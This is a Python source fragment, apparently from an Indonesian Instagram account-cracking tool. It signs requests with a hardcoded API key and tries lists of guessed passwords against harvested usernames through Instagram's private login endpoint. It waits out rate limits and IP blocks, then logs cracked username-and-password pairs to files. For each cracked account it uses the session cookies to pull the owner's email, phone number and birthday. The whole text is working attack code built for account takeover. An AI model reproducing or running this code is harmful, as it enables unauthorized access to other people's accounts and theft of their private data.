			base = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
			kode = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
			data = {"signed_body": f"{kode}.{str(base)}"}
			head = {'Host': 'b.i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'LTE', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'en-GB', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			one = ses.post("https://b.i.instagram.com/api/v1/qe/sync/",headers=head,data=data).json()
			if "ok" in one["status"]:break
			else: continue
		except:pass
	for pw in pewe:
		try:
			csrf = ses.cookies["csrftoken"]
			data = {"phone_id": str(uuid.uuid4()),"_csrftoken": csrf,"username": user,"guid": str(uuid.uuid4()),"device_id": "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],"password": pw,"login_attempt_count": str(sesion)}
			ned = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
			date = f"signed_body={ned}.%7B%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{csrf}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22password%22%3A%22{pw}%22%2C%22login_attempt_count%22%3A%22{sesion}%22%7D&ig_sig_key_version=4"
			head = {'Host': 'b.i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': 'LTE', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'ar-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			bz = ses.post(f"https://b.i.instagram.com/api/v1/accounts/login/",headers=head,data=date)
		 #prints(bz.text,"\n\r")
			sesion += 1
			if "logged_in_user" in bz.text:
				user = bz.json()["logged_in_user"]["username"]
				na, pg, mg, ps = cek_info(user)
				open(".ua_instagram.txt","a").write(str(ua)+"\n")
				if "no" in pilih_info:
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]useragent  : {K2}{ua}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps))
				else:
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					em, nop, ttl, thn = cek_data2(coki)
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]following  : {H2}{mg}")
					akun.add(f" [bold white]useragent  : {K2}{ua}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps,nop,ttl))
				ok+=1
				#try:cek_email(ses.cookies.get_dict()["sessionid"])
				#except:pass				
				break
			elif "challenge_required" in bz.text:
				na, pg, mg, ps = cek_info(user)
				akun = Tree(Panel.fit(f" [bold white]{K2}{user}{P2} | {K2}{pw}",style="bold white"))
				akun.add(f" [bold white]followers  : {K2}{pg}")
				akun.add(f" [bold white]following  : {K2}{mg}")
				akun.add(f" [bold white]postingan  : {K2}{ps}")
				akun.add(f" [bold white]useragent  : {K2}{ua}")
				prints(akun)
				print()
				cp+=1
				open(sim_cp,'a').write('%s | %s | %s | %s \n'%(user,pw,pg,mg))
				break
			elif "Error" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v3{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Kesalahan" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v2{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Harap tunggu beberASUapa menit sebelum mencoba lagi." in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v1{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(10)
			elif 'ip_block' in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v4{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
		#except Exception as e:print(e)
	loop+=1
	


##---[ CEK DATA HASIL ]---###
def cek_info(user):
	ua = "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)"
	try:dt = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}',headers={"user-agent": ua,"x-ig-app-id": "936619743392459"}).json()["data"]["user"]
	except:dt=''
	try:na = dt["full_name"]
	except:na = '-'
	try:pg = dt["edge_followed_by"]["count"]
	except:pg = '0'
	try:mg = dt["edge_follow"]["count"]
	except:mg = '0'
	try:ps = dt["edge_owner_to_timeline_media"]["count"]
	except:ps = '0'
	return na, pg, mg, ps

###---[ CEK DATA ]---###
def cek_data2(coki):
	try:url = ses.get("https://i.instagram.com/api/v1/accounts/edit/web_form_data/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)","x-ig-app-id": "936619743392459"},cookies={"cookie": coki}).json()["form_data"]
	except:url = ""
	try:email = url["email"]
	except:email = "-"
	if len(email)<1: em = "-"
	else: em = email
	try:nop = "0"+url["phone_number"].replace("+62 ","")
	except:nop = "-"
	try:
		y,m,d = url["birthday"].split("-")
		ttl = f"{d}-{tete[m]}-{y}"
	except:ttl = "-"
	try:
		link = parser(ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":coki}).text, "html.parser").find("body")
		data = json.loads(link.find("script", text=lambda t: t.startswith("window._sharedData")).string.split(" = ", 1)[1].rstrip(";"))["entry_data"]['SettingsPages']
		bikin = datetime.fromtimestamp(int(re.findall('\d+',str(data))[0])).strftime('%d %B %Y')
	except Exception as e: bikin = "-"
	return em, nop, ttl, bikin


		
###---[ MAKEDIRECTORY ]---###
def makedirectory():
	try:os.mkdir('STAROZ')
	except:pass
	try:os.mkdir('OK1+')
	except:pass
	try:os.mkdir('OK100+')
	except:pass
	try:os.mkdir('OK1000+')
	except:pass
	back()

if __name__ == '__main__':
	#MetodApi("maryulitajanessa", ["maryulita"])
	makedirectory()
